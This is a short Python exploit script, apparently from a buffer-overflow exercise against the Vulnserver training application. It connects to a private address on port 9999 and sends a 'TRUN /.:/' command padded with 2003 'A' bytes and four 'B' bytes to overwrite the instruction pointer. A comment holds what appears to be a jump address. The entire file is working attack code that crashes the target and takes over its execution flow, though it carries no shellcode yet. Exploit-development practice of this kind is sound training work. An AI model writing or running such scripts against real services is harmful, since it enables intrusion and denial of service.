#!/usr/bin/python
     
import sys, socket
#625011af
shellcode = "A" * 2003 
shellcode+="B" *4


payload = "TRUN /.:/" + shellcode 


try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.162.133',9999))
    print ("[+] Sending the payload...\n" + str(len(payload)))
    s.send((payload.encode()))
    s.close()
except:
    #print ("The fuzzing crashed at %s bytes" % str(len(payload)))
    print("Error connecting to server")
    sys.exit()